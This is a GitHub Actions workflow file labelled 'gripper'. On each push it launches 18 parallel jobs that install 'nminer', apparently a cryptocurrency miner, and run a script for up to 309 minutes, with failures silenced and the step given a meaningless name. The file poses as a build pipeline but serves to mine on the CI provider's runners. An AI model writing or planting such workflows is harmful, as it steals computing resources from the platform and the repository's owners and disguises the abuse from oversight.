name: gripper
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7669 }
          - { version: 9227 }
          - { version: 2491 }
          - { version: 3284 }
          - { version: 2470 }
          - { version: 2272 }
          - { version: 4834 }
          - { version: 9560 }
          - { version: 2651 }
          - { version: 4799 }
          - { version: 6927 }
          - { version: 1494 }
          - { version: 3204 }
          - { version: 4325 }
          - { version: 7637 }
          - { version: 5399 }
          - { version: 6415 }
          - { version: 3553 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: silently gee impish
        run: |
          npm install nminer@latest
          timeout 309m node gripper.js || echo "gripper executed"